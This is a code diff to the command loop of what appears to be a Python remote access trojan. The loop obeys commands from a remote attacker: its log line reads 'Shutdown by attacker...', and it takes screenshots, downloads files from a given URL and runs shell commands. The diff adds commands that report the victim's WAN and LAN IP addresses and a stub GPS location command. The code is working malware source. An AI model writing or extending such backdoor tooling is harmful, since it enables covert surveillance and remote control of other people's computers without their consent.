@@ -20,6 +20,7 @@ import constant
 import downloader
 import handler
 import logger
+import net
 import screenshot
 
 
@@ -109,14 +110,24 @@ def main():
                         logger.info("Shutdown by attacker...")
                         shutdown = True
                         break
-                    if rl_cmd == command.Command.SCREENSHOT.value:
-                        logger.info("Taking screenshot...")
+                    elif rl_cmd == command.Command.SCREENSHOT.value:
                         output = screenshot.pyscreenshot_screenshot()
-                    if rl_cmd == command.Command.DOWNLOAD.value:
+                    elif rl_cmd == command.Command.DOWNLOAD.value:
                         if params_len >= 1:
                             url = params[0]
                             downloader.download(url)
                             output = handler.encode("Done downloading the file!")
+
+                    elif rl_cmd == command.Command.WAN_IP.value:
+                        wan_ip = net.wan_ip()
+                        output = handler.encode(wan_ip)
+
+                    elif rl_cmd == command.Command.LAN_IP.value:
+                        lan_ip = net.lan_ip()
+                        output = handler.encode(lan_ip)
+
+                    elif rl_cmd == command.Command.LOCATION.value:
+                        logger.info("GPS...")
                 # Check regular shell command.
                 else:
                     if "cd" in full_cmd:
